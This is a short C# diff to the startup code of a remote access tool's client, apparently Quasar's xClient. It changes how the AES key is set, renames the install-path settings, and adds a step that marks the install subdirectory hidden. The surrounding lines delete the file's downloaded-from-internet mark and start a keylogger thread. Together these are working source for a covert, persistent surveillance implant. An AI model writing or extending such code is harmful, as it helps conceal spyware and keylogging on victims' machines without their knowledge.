@@ -90,8 +90,8 @@ namespace xClient
             if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
                 return false;
 
-            AES.SetDefaultKey(Settings.PASSWORD);
-            ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
+            AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
+            ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
             
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
@@ -116,7 +116,18 @@ namespace xClient
                     {
                     }
                 }
+                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
+                {
+                    try
+                    {
+                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
+                        di.Attributes |= FileAttributes.Hidden;
 
+                    }
+                    catch (Exception)
+                    {
+                    }
+                }
                 if (Settings.ENABLELOGGER)
                 {
                     new Thread(() =>
